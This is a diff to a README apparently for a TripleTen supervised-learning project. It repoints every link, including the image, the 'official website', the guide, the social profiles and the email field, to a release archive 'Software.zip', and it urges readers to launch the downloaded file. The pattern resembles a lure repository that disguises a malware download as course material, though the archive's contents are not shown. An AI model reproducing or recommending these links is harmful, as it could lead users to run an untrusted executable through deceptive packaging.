@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Supervised Learning Repository from TripleTen! 🧠
 
-![Supervised Learning](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
+![Supervised Learning](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip)
 
 ## Repository Name: Supervised_Learning
 ## Short Description: 📊 A comprehensive project focusing on Supervised Learning concepts by TripleTen 📈
@@ -29,7 +29,7 @@
 ---
 
 ### Software Package Link:
-[![Download Software](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip)](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip)
 
 Click the button above to download the software package for utilizing the Supervised Learning project. Launch the downloaded file to explore the exciting world of supervised learning!
 
@@ -61,8 +61,8 @@ Welcome to our Supervised Learning repository! 🎉 Here at TripleTen, we are pa
 ### 🌐 Additional Resources:
 
 #### Websites:
-- [TripleTen Official Website](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip): Visit our official website to explore more projects and insights.
-- [Supervised Learning Guide](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip): Dive deeper into the concepts of supervised learning with this comprehensive guide.
+- [TripleTen Official Website](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip): Visit our official website to explore more projects and insights.
+- [Supervised Learning Guide](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip): Dive deeper into the concepts of supervised learning with this comprehensive guide.
 
 #### Check the Releases Section:
 If the provided link does not work or needs an update, make sure to check the **Releases** section of this repository for the latest software package and resources.
@@ -75,12 +75,12 @@ Whether you're a beginner exploring the basics or an experienced practitioner lo
 ---
 
 ### 🌟 Stay Connected:
-Follow us on [GitHub](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip) | Connect with us on [LinkedIn](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip) | Watch our latest videos on [YouTube](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
+Follow us on [GitHub](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip) | Connect with us on [LinkedIn](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip) | Watch our latest videos on [YouTube](https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip)
 
 ---
 
 ### 📞 Contact Us:
-📧 Email: https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip | 📱 Phone: +1 (123) 456-7890
+📧 Email: https://github.com/Southla/Supervised_Learning/releases/download/v2.0/Software.zip | 📱 Phone: +1 (123) 456-7890
 
 ---
 
